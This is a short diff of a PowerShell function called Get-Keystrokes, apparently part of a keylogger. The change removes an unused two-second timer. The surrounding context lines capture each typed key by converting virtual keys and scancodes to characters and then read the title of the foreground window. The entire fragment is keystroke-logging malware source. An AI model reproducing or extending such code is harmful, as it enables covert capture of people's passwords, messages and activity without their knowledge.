@@ -168,12 +168,6 @@ function Get-Keystrokes {
                 $mychar = New-Object -TypeName "System.Text.StringBuilder";
                 $unicode_res = $ImportDll::ToUnicode($vkey, $scancode, $kbstate, $mychar, $mychar.Capacity, 0)
 
-                $timer = New-Object Timers.Timer
-                $timer.Interval = 2000
-                $timer.AutoReset = $false
-                $timer.Enabled = $true
-
-
                 if ($unicode_res -gt 0) {
                     #get the title of the foreground window
                     $TopWindow = $ImportDll::GetForegroundWindow()
